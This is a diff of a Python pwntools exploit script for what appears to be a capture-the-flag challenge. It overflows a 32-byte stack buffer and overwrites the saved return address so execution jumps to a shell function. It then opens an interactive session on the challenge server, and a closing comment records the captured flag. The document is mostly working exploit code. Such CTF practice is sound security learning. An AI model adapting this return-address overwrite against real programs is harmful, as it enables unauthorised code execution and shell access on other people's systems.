@@ -1,32 +1,19 @@
 from pwn import *
-context(arch = 'amd64', os = 'linux')
 
-# # p = remote('game.sigflag.at', 3041)
-p = process("./pwn1")
-print(p.recvuntil(b">", drop=False))
+context(arch = 'amd64', os = 'linux', terminal=['tmux', 'split-window', '-h'])
 
+io = remote('game.sigflag.at', 3041)
 
+# io = process("./pwn1")
+# gdb.attach(io, gdbscript='b *0x400B83')
 
-# payload = "AAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSAAAAA"
-# payload += p32(0xdeadbeef)
-# Buffer: 32
-# Input: 48
-# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
-# 32 A
-# BC = rbp
-# 
+print(io.recvuntil(b">", drop=False))
 
 payload = 32 * b"A"
-# 0x00400b8e
-payload += b"\x8e\x0b\x40\x00\x00\x00\x00\x00"
+payload += p64(0x0)             # rbp
+payload += p64(0x400B87)        # rip, shell is 0x400b8e
 
-# we want to jump to 0x00400b8e
-# 0x00400b8e: pop r
-# payload += p64(0x00400b8e)
+io.sendline(payload)
+io.interactive()
 
-print(payload)
-
-p.sendline(payload)
-p.interactive()
-
-# /bin/bash 00400b8e
+# SIG{Ev3Ry_d4y_1M_buFf3r1Ng}
